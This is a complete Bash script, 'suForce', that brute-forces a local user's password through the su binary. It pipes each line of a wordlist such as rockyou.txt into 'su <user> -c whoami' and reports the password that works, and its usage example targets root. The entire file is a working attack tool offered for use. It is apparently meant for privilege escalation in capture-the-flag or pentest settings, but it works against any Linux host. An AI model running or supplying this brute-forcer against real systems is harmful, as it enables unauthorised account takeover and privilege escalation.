#!/bin/bash

readonly RED="\e[91m"
readonly GREEN="\e[92m"
readonly YELLOW="\e[93m"
readonly BLUE="\e[94m"
readonly WHITE="\e[97m"
readonly END="\e[0m"
readonly SEPARATOR="───────────────────────────────────"

trap ctrl_c INT

function banner(){
  echo -e "${GREEN}            _____                          ${END}"
  echo -e "${RED} ___ _   _ ${GREEN}|  ___|__  _ __ ___ ___   ${END}"
  echo -e "${RED}/ __| | | |${GREEN}| |_ / _ \| '__/ __/ _ \\ ${END}"
  echo -e "${RED}\__ \ |_| |${GREEN}|  _| (_) | | | (_|  __/  ${END}"
  echo -e "${RED}|___/\__,_|${GREEN}|_|  \___/|_|  \___\___|  ${END}"
  echo -e "${SEPARATOR}"
  echo -e " code: ${YELLOW}d4t4s3c${END}     version: ${YELLOW}v1.0.0${END}"
  echo -e "${SEPARATOR}"
}

function help(){
  echo -e " ❓  Usage: suForce [OPTIONS]\n"
  echo -e " 🌐  Get a user password with the su binary.\n"
  echo -e " 📋  Options:"
  echo -e "       -u <USER>      Specify the username you want to attack."
  echo -e "       -w <WORDLIST>  Specify the path where the wordlist is located."
  echo -e "       -h             Display this help message and exit.\n"
  echo -e " 💡  Examples:"
  echo -e "       suForce -u root -w rockyou.txt"
  echo -e "       suForce -h \n"
  echo -e "${SEPARATOR}\n"
}

function info(){
  echo -e "🎯 Username | ${BLUE}${USERNAME}${END}"
  echo -e "📖 Wordlist | ${BLUE}${WORDLIST}${END}"
}

function ctrl_c(){
  echo
  tput cnorm
  exit 1
}

while getopts ":u:w:" ARG; do
  case ${ARG} in
    u) USERNAME=$OPTARG; let parameter_counter+=1 ;;
    w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
  esac
done

if [[ -n "${USERNAME}" && -n "${WORDLIST}" ]]; then
  banner
  info
else
  banner
  help
  exit 0
fi

LINES=$(wc -l ${WORDLIST})
REGEX="([0-9]+).${WORDLIST}"
[[ ${LINES} =~ ${REGEX} ]]
SIZ="${BASH_REMATCH[1]}"
while IFS= read -r PASSWORD; do
  LINE=$((LINE + 1))
  PROGRESS=$((LINE * 100 / SIZ))
  echo -ne "\e[?25l\r\033[K🔎 Status   | ${YELLOW}${LINE}/${SIZ}/${PROGRESS}%/${PASSWORD}${END}"
  echo "${PASSWORD}" | timeout 0.1 bash -c "su ${USERNAME} -c whoami &>/dev/null"
  if [ $? -eq 0 ]; then
    echo -e "\n💥 Password | ${GREEN}${PASSWORD}${RED}${END}"
    echo -e "${SEPARATOR}\n\n"
    sleep 2
    tput cnorm
    exit 0
  fi
done < ${WORDLIST}
echo -e "\n❗ Fuck!    | ${RED}Password not found${END}"
echo -e "${SEPARATOR}\n\n"
sleep 2
tput cnorm
exit 0
